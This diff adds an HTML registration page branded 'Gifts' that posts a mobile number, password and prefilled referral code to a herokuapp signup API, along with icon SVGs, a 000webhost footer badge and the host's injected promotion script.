@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Register</title>
+  <!-- <link rel="stylesheet" href=
+  "https://ritzier-nameplates.000webhostapp.com/style.css"> -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href=
+  "./style(1).css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1">
+  <script>
+    function formSubmit(e){
+      console.log("hiii", $('input[name=mobileNumber]').val())
+
+e.preventDefault(); //This will prevent the default click action.
+
+// Create DataString
+let obj = {
+  mobileNumber: $('input[name=mobileNumber]').val(),
+  password: $('input[name=password]').val(),
+  code: $('input[name=code]').val()
+}
+
+                
+
+$.ajax({
+   type: "POST",
+   url: "https://businessminion.herokuapp.com/api/signup",
+   data: obj,
+   success: function(res) {
+       alert(res.message);
+   },  
+   error: function(err) {
+       alert('There was an error submitting the form');
+   }   
+}); 
+return false; // Returning false will stop page from reloading.
+}   
+
+  </script>
+</head>
+<body>
+  <div class="bodyViewWrap">
+    <div class="pageHeaderWrap">
+      <div class="headerBackButton">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink=
+        "http://www.w3.org/1999/xlink" version="1.1" x="0px" y=
+        "0px" viewbox="0 0 443.52 443.52" style=
+        "enable-background:new 0 0 443.52 443.52;" xml:space=
+        "preserve">
+        <g>
+          <path d=
+          "M143.492,221.863L336.226,29.129c6.663-6.664,6.663-17.468,0-24.132c-6.665-6.662-17.468-6.662-24.132,0l-204.8,204.8 c-6.662,6.664-6.662,17.468,0,24.132l204.8,204.8c6.78,6.548,17.584,6.36,24.132-0.42c6.387-6.614,6.387-17.099,0-23.712 L143.492,221.863z">
+          </path>
+        </g></svg>
+      </div>
+      <div class="headerLogo">
+        <h3>Gifts</h3>
+      </div>
+    </div>
+    <div class="pageBobyWrap">
+      <div class="formOuterWrap">
+
+        <form >
+          <div class="inputWrapper">
+            <span class="iconWrap"><i class='fa fa-comments' style='font-size:20px'></i></span> <input name="code" maxlength="140" placeholder=
+            "Recommendation Code" value="855346edeab04188b9b7590bf403f226" autocomplete="off"
+            type="text">
+          </div>
+          <div class="inputWrapper mobileInput">
+            <span class="iconWrap"><i class="fa fa-mobile" style="font-size:26px"></i></span> <input maxlength="140" autocomplete=
+            "off" type="text" name="mobileNumber" placeholder="Mobile Numer" required>
+          </div>
+          <div class="inputWrapper">
+            <span class="iconWrap"><i class="fa fa-key" style="font-size:18px"></i></span> <input placeholder="Password" type="password" name="password"
+            autocomplete="off" type="text">
+          </div>
+          
+          <div class="inputActionWrap">
+            <input type="submit" value="Continue" onclick="formSubmit(event)">
+          </div>
+        </form>
+        
+      </div>
+    </div>
+    <div class="pageFooterWrap">
+      <ul>
+        <li><span class="iconWrap"><svg xmlns=
+        "http://www.w3.org/2000/svg" xmlns:xlink=
+        "http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x=
+        "0px" y="0px" viewbox="0 0 463.937 463.937" style=
+        "enable-background:new 0 0 463.937 463.937;" xml:space=
+        "preserve">
+        <g>
+          <path d=
+          "M460.414,216.518l-85.6-73.1c0.1-0.5,0.2-1,0.3-1.6v-95.6c-0.1-5.7-4.6-10.3-10.3-10.5h-47.8c-5.5,0-10,4.9-10,10.5v39.6 l-68.5-58.4c-3.7-3.2-9.2-3.2-13,0l-221.9,189c-4.3,3.5-4.8,9.8-1.3,14.1s9.8,4.8,14.1,1.3c0.1-0.1,0.1-0.1,0.2-0.2l215.4-183.4 l77.1,65.7l46.1,39.2l92.3,78.6c4.2,3.6,10.5,3.1,14.1-1.1C465.114,226.418,464.614,220.118,460.414,216.518z M355.014,126.518 l-28-23.6v-47.1h28V126.518z">
+          </path>
+        </g>
+        <g>
+          <path d=
+          "M416.314,236.718l-28.1-24l-149.7-127.9c-3.7-3.2-9.2-3.2-13,0l-149.7,127.9l-28.1,24c-4.2,3.6-4.7,9.9-1.1,14.1 c3.5,4.2,9.7,4.7,13.8,1.2l0.1-0.1l12.5-10.8v187.5c0.1,5.6,4.7,10.2,10.3,10.3h297.3c5.6-0.1,10.2-4.6,10.3-10.3v-187.5 l12.5,10.8c1.8,1.5,4,2.4,6.4,2.4c2.9,0,5.7-1.3,7.6-3.5C421.114,246.518,420.514,240.218,416.314,236.718z M272.014,418.818h-80 v-108h80V418.818z M292.014,418.818v-117.7c0-5.5-4.1-10.3-9.6-10.3h-100.8c-5.5,0-9.6,4.8-9.6,10.3v117.7h-79v-194.8l139-118.4 l139,118.4v194.8H292.014z">
+          </path>
+        </g></svg></span> <span class="textWrap">Home</span></li>
+        <li><span class="iconWrap"><svg xmlns=
+        "http://www.w3.org/2000/svg" xmlns:xlink=
+        "http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x=
+        "0px" y="0px" viewbox="0 0 512 512" style=
+        "enable-background:new 0 0 512 512;" xml:space="preserve">
+        <g>
+          <path d=
+          "M487.59,299.894h-7.662v-69.015c0-10.926-5.438-20.6-13.743-26.478v-9.397c0-13.631-11.089-24.72-24.72-24.72h-5.721 l21.889-32.12c7.337-10.766,4.547-25.495-6.219-32.833L302.883,4.111c-5.215-3.555-11.501-4.867-17.705-3.69 c-6.201,1.175-11.574,4.694-15.128,9.91L141.849,198.454h-35.675l8.607-87.13c0.097-0.982,0.735-1.833,1.625-2.168 c11.089-4.181,20.699-11.989,27.059-21.985c0.501-0.787,1.446-1.237,2.424-1.138l55.955,5.528 c4.012,0.389,7.581-2.533,7.977-6.543s-2.533-7.581-6.543-7.977l-55.955-5.528c-6.495-0.636-12.689,2.357-16.169,7.825 c-4.676,7.35-11.742,13.09-19.895,16.164c-6.137,2.314-10.351,7.826-10.999,14.387l-8.748,88.564h-9.303L95.821,60.649 c0.49-4.96,4.917-8.604,9.883-8.107l113.074,11.17c4.01,0.387,7.581-2.533,7.977-6.543s-2.533-7.581-6.543-7.977l-113.074-11.17 C94.174,36.743,82.581,46.248,81.3,59.214l-10.972,111.07H51.643c-13.63,0-24.72,11.089-24.72,24.72v6.41 c-11.151,5.134-18.915,16.406-18.915,29.465v248.695c0,17.88,14.546,32.426,32.427,32.426h407.067 c17.88,0,32.426-14.546,32.426-32.426V410.56h7.662c9.044,0,16.401-7.357,16.401-16.4v-77.865 C503.992,307.251,496.634,299.894,487.59,299.894z M441.465,184.876L441.465,184.876c5.586-0.001,10.129,4.543,10.129,10.129 v3.717c-1.342-0.17-2.705-0.267-4.092-0.267h-30.955l9.253-13.579H441.465z M282.107,18.547c1.36-1.995,3.415-3.341,5.787-3.791 c0.567-0.107,1.136-0.161,1.701-0.161c1.797,0,3.553,0.538,5.071,1.572l148.531,101.22c4.118,2.807,5.186,8.441,2.38,12.559 l-46.686,68.506h-11.204l22.889-33.587c3.712-5.447,4.018-12.379,0.796-18.092c-4.282-7.59-6.018-16.527-4.888-25.166 c0.84-6.427-1.988-12.701-7.38-16.375L322.106,52.76c-5.393-3.675-12.267-4.012-17.941-0.879 c-7.625,4.21-16.578,5.863-25.208,4.655c-6.4-0.898-12.891,1.992-16.548,7.357l-91.699,134.56h-11.204L282.107,18.547z M285.32,142.438c-31.771,0-57.851,24.773-59.976,56.015h-36.979L274.464,72.11c0.001,0,0.001,0,0.001,0 c0.489-0.719,1.3-1.147,2.133-1.147c0.111,0,0.222,0.008,0.333,0.023c11.738,1.642,23.913-0.604,34.285-6.331 c0.816-0.452,1.864-0.387,2.672,0.163l76.999,52.473c0.806,0.55,1.249,1.502,1.129,2.426c-1.537,11.749,0.825,23.903,6.648,34.225 c0.467,0.829,0.41,1.891-0.144,2.706l-28.488,41.804h-24.733C343.172,167.211,317.093,142.438,285.32,142.438z M330.668,198.454 h-90.695c2.09-23.189,21.624-41.424,45.347-41.424C309.044,157.029,328.579,175.265,330.668,198.454z M41.514,195.004 c0-5.586,4.543-10.13,10.129-10.13h17.244l-1.341,13.579H41.514V195.004z M22.599,230.879c0-9.834,8.001-17.835,17.836-17.835 h407.067c9.835,0,17.835,8.001,17.835,17.835v20.244H22.599V230.879z M465.337,479.574c0,9.834-8,17.835-17.835,17.835H40.435 c-9.835,0-17.836-8.001-17.836-17.835V459.33h39.342c4.03,0,7.295-3.266,7.295-7.295c0-4.029-3.266-7.295-7.295-7.295H22.599 V265.714h442.738v34.18h-69.366h-0.001c-21.856,0-40.788,12.74-49.773,31.181c-0.03,0.062-0.064,0.122-0.095,0.184 c-0.076,0.157-0.142,0.32-0.216,0.478c-1.07,2.273-2,4.626-2.757,7.054c-0.002,0.007-0.004,0.013-0.006,0.02 c-1.615,5.189-2.486,10.702-2.486,16.416c0,30.511,24.822,55.333,55.332,55.333h0.001h69.366v34.18H108.655 c-4.03,0-7.295,3.266-7.295,7.295c0,4.029,3.266,7.295,7.295,7.295h356.682V479.574z M489.401,394.159 c0,0.998-0.812,1.81-1.811,1.81h-91.618c-15.445,0-28.911-8.639-35.818-21.338c-0.314-0.577-0.614-1.163-0.901-1.756 c-0.573-1.187-1.09-2.406-1.547-3.654c-1.602-4.366-2.476-9.08-2.476-13.994s0.875-9.628,2.476-13.994 c0.458-1.247,0.975-2.466,1.547-3.654c0.287-0.593,0.587-1.179,0.901-1.756c6.907-12.699,20.373-21.338,35.818-21.338h91.618 c0.998,0,1.811,0.812,1.811,1.81V394.159z">
+          </path>
+        </g>
+        <g>
+          <path d=
+          "M397.681,325.627c-16.322,0-29.6,13.279-29.6,29.6c0,16.321,13.278,29.599,29.6,29.599c16.322,0,29.6-13.278,29.6-29.599 C427.281,338.906,414.003,325.627,397.681,325.627z M397.681,370.235c-8.276,0-15.009-6.733-15.009-15.008 c0-8.275,6.733-15.009,15.009-15.009s15.009,6.733,15.009,15.009S405.957,370.235,397.681,370.235z">
+          </path>
+        </g></svg></span> <span class="textWrap">Games</span></li>
+        <li><span class="iconWrap"><svg xmlns=
+        "http://www.w3.org/2000/svg" viewbox="-42 0 512 512.001">
+        <path d=
+        "m210.351562 246.632812c33.882813 0 63.21875-12.152343 87.195313-36.128906 23.96875-23.972656 36.125-53.304687 36.125-87.191406 0-33.875-12.152344-63.210938-36.128906-87.191406-23.976563-23.96875-53.3125-36.121094-87.191407-36.121094-33.886718 0-63.21875 12.152344-87.191406 36.125s-36.128906 53.308594-36.128906 87.1875c0 33.886719 12.15625 63.222656 36.128906 87.195312 23.980469 23.96875 53.316406 36.125 87.191406 36.125zm-65.972656-189.292968c18.394532-18.394532 39.972656-27.335938 65.972656-27.335938 25.996094 0 47.578126 8.941406 65.976563 27.335938 18.394531 18.398437 27.339844 39.980468 27.339844 65.972656 0 26-8.945313 47.578125-27.339844 65.976562-18.398437 18.398438-39.980469 27.339844-65.976563 27.339844-25.992187 0-47.570312-8.945312-65.972656-27.339844-18.398437-18.394531-27.34375-39.976562-27.34375-65.976562 0-25.992188 8.945313-47.574219 27.34375-65.972656zm0 0">
+        </path>
+        <path d=
+        "m426.128906 393.703125c-.691406-9.976563-2.089844-20.859375-4.148437-32.351563-2.078125-11.578124-4.753907-22.523437-7.957031-32.527343-3.3125-10.339844-7.808594-20.550781-13.375-30.335938-5.769532-10.15625-12.550782-19-20.160157-26.277343-7.957031-7.613282-17.699219-13.734376-28.964843-18.199219-11.226563-4.441407-23.667969-6.691407-36.976563-6.691407-5.226563 0-10.28125 2.144532-20.042969 8.5-6.007812 3.917969-13.035156 8.449219-20.878906 13.460938-6.707031 4.273438-15.792969 8.277344-27.015625 11.902344-10.949219 3.542968-22.066406 5.339844-33.042969 5.339844-10.96875 0-22.085937-1.796876-33.042968-5.339844-11.210938-3.621094-20.300782-7.625-26.996094-11.898438-7.769532-4.964844-14.800782-9.496094-20.898438-13.46875-9.753906-6.355468-14.808594-8.5-20.035156-8.5-13.3125 0-25.75 2.253906-36.972656 6.699219-11.257813 4.457031-21.003906 10.578125-28.96875 18.199219-7.609375 7.28125-14.390625 16.121094-20.15625 26.273437-5.558594 9.785157-10.058594 19.992188-13.371094 30.339844-3.199219 10.003906-5.875 20.945313-7.953125 32.523437-2.0625 11.476563-3.457031 22.363282-4.148437 32.363282-.679688 9.777344-1.023438 19.953125-1.023438 30.234375 0 26.726562 8.496094 48.363281 25.25 64.320312 16.546875 15.746094 38.4375 23.730469 65.066406 23.730469h246.53125c26.621094 0 48.511719-7.984375 65.0625-23.730469 16.757813-15.945312 25.253906-37.589843 25.253906-64.324219-.003906-10.316406-.351562-20.492187-1.035156-30.242187zm-44.90625 72.828125c-10.933594 10.40625-25.449218 15.464844-44.378906 15.464844h-246.527344c-18.933594 0-33.449218-5.058594-44.378906-15.460938-10.722656-10.207031-15.933594-24.140625-15.933594-42.585937 0-9.59375.316406-19.066407.949219-28.160157.617187-8.921874 1.878906-18.722656 3.75-29.136718 1.847656-10.285156 4.199219-19.9375 6.996094-28.675782 2.683593-8.378906 6.34375-16.675781 10.882812-24.667968 4.332031-7.617188 9.316407-14.152344 14.816407-19.417969 5.144531-4.925781 11.628906-8.957031 19.269531-11.980469 7.066406-2.796875 15.007812-4.328125 23.628906-4.558594 1.050781.558594 2.921875 1.625 5.953125 3.601563 6.167969 4.019531 13.277344 8.605469 21.136719 13.625 8.859375 5.648437 20.273437 10.75 33.910156 15.152344 13.941406 4.507812 28.160156 6.796875 42.273437 6.796875 14.113282 0 28.335938-2.289063 42.269532-6.792969 13.648437-4.410156 25.058594-9.507813 33.929687-15.164063 8.042969-5.140624 14.953125-9.59375 21.121094-13.617187 3.03125-1.972656 4.902344-3.042969 5.953125-3.601563 8.625.230469 16.566406 1.761719 23.636719 4.558594 7.636719 3.023438 14.121093 7.058594 19.265625 11.980469 5.5 5.261719 10.484375 11.796875 14.816406 19.421875 4.542969 7.988281 8.207031 16.289062 10.886719 24.660156 2.800781 8.75 5.15625 18.398438 7 28.675782 1.867187 10.433593 3.132812 20.238281 3.75 29.144531v.007812c.636719 9.058594.957031 18.527344.960937 28.148438-.003906 18.449219-5.214844 32.378906-15.9375 42.582031zm0 0">
+        </path></svg></span> <span class="textWrap">My</span></li>
+      </ul>
+    </div>
+  </div>
+  <div style=
+  "text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;">
+    <a title=
+    "Hosted on free web hosting 000webhost.com. Host your own website for FREE."
+    target="_blank" href=
+    "https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img">
+    <img src=
+    "https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"
+    alt="www.000webhost.com"></a>
+  </div>
+  <script>
+  function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&¬ification.length>0&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Go for it<\/button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday Prices",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 22px; font-weight: 700; text-transform: uppercase;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Get 90% Off!",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="Get Web Hosting for $0.99/month + SSL Certificate for FREE!",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 700; margin-bottom: 15px;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'<\/div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2020-wp-inject-img.png"><\/div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}
+  </script>
+</body>
+</html>
